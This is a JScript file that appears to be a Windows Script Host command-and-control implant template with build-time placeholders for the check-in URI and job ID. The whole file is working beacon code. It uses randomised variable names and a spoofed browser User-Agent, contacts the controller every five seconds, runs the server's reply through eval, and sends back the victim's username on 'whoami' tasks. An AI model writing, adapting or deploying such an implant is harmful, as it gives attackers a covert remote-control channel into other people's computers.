var NVBpaEsftE = 0;
var wscriptshell = new ActiveXObject("WScript.Shell");
response = '[["{{ check_in_job_id }}"]]';

function eCAOpXulfR(data){
  try {
    var CAOrmAizys = new ActiveXObject("WinHttp.WinHttpRequest.5.1");;
    CAOrmAizys.Open('Post', '{{ check_in_uri }}');
    CAOrmAizys.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0");
    CAOrmAizys.setRequestHeader("X-Frame-Options", "SAMEORIGIN");
    CAOrmAizys.setRequestHeader("Content-Type", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
    CAOrmAizys.Send(data);
    CAOrmAizys.WaitForResponse();
    return CAOrmAizys;
  } catch (e) {
    NVBpaEsftE = NVBpaEsftE + 1;
    if(NVBpaEsftE > 50){
      WScript.Quit(1);
    }
  }
}


while (true) {
  try {
      eval("jobs=" + eCAOpXulfR(response).responseText + ";");
      response = '[["{{ check_in_job_id }}"]';
      for (var key in jobs) {
          if (jobs[key][0] == 'whoami') {
              username = wscriptshell.ExpandEnvironmentStrings("%USERNAME%");
              response = response + ',["' + key + '","' +  username + '"]';
          }
          if (jobs[key][0] == 'downstream') {
              WScript.Echo(jobs[key][1])
          }
      }
  } catch (e) {
      response = '[["{{ check_in_job_id }}"]]';
  }
  response = response + ']';
  WScript.Sleep(5000);
}